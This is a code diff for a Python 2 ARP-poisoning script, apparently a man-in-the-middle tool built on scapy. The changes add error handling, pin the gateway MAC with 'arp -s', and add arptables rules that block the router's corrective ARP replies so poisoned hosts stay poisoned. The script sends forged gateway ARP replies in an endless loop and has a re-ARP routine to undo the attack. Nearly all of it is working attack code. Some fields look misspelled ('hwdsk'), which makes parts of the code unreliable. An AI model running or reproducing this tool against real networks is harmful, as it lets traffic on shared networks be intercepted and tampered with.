@@ -36,40 +36,51 @@ def poisonall(gateway):
 	f = open(os.path.dirname(os.path.abspath(__file__)) + "/arpmitm.txt", 'r')
 	temp = f.readline()
 	temp = f.readline()
-	mac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", temp).groups()[0]
-	os.system("echo " + mac + " > " + os.path.dirname(os.path.abspath(__file__)) + "/arpmitm.txt")
-	time.sleep(.5)
-	packet = ARP()
-	packet.op = 2
-	packet.psrc = gateway
-	packet.hwdsk = 'ff:ff:ff:ff:ff:ff'
-	temp2 = gateway.rpartition(".")
-	random = temp2[0]
-	random = random + ".37"
-	packet.pdst = random
-	time.sleep(2)
-	while 1:
+	try:
+	   mac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", temp).groups()[0]
+	   os.system("arp -s " + gateway + " " + mac)
+	   os.system("echo " + mac + " > " + os.path.dirname(os.path.abspath(__file__)) + "/arpmitm.txt")
+	   time.sleep(.5)
+	   packet = ARP()
+	   packet.op = 2
+	   packet.psrc = gateway
+	   packet.hwdsk = 'ff:ff:ff:ff:ff:ff'
+	   temp2 = gateway.rpartition(".")
+	   random = temp2[0]
+	   random = random + ".37"
+	   packet.pdst = random
+	   time.sleep(.5)
+	   #do not allow router re-arps through to already poisoned hosts
+	   os.system("arptables -F")
+	   os.system("arptables -A FORWARD -s " + gateway + " -j DROP")
+	   while 1:
 		send(packet, verbose=0)
-		time.sleep(2)
-		send(packet, verbose=0)
+		time.sleep(10)
+	except:
+		print 'Unable to determine gateway. Please ensure proper network connectivity and try again.'
 
 def rearp(gateway):
+	os.system("arptables -F")
 	packet = ARP()
 	packet.op = 2
-	f = open(os.path.dirname(os.path.abspath(__file__)) + "/arpmitm.txt", 'r')
-	mac = f.readline()
-	macaddr = mac.rstrip("\n")
-	packet.hwsrc = macaddr
-	packet.psrc = gateway
-	packet.hwdsk = 'ff:ff:ff:ff:ff:ff'
-	temp2 = gateway.rpartition(".")
-	random = temp2[0]
-	random = random + ".37" #random ip  - required
-	packet.pdst = random
-	for i in range(0,5):
-	   send(packet, verbose=0)
-	   time.sleep(1)
-	   send(packet, verbose=0)
-
+	#check if files exist first
+	if (os.path.exists(os.path.dirname(os.path.abspath(__file__)) + "/arpmitm.txt")):
+		f = open(os.path.dirname(os.path.abspath(__file__)) + "/arpmitm.txt", 'r')
+		mac = f.readline()
+		macaddr = mac.rstrip("\n")
+		packet.hwsrc = macaddr
+		packet.psrc = gateway
+		packet.hwdsk = 'ff:ff:ff:ff:ff:ff'
+		temp2 = gateway.rpartition(".")
+		random = temp2[0]
+		random = random + ".37" #random ip  - required
+		packet.pdst = random
+		for i in range(0,5):
+	   		send(packet, verbose=0)
+	   		time.sleep(1)
+	   		send(packet, verbose=0)
+		print 'Network Re-ARP Completed'
+	else:
+		print 'Router MAC address could not be found. Re-ARPing failed.'
 if __name__ == '__main__':
 			 main()
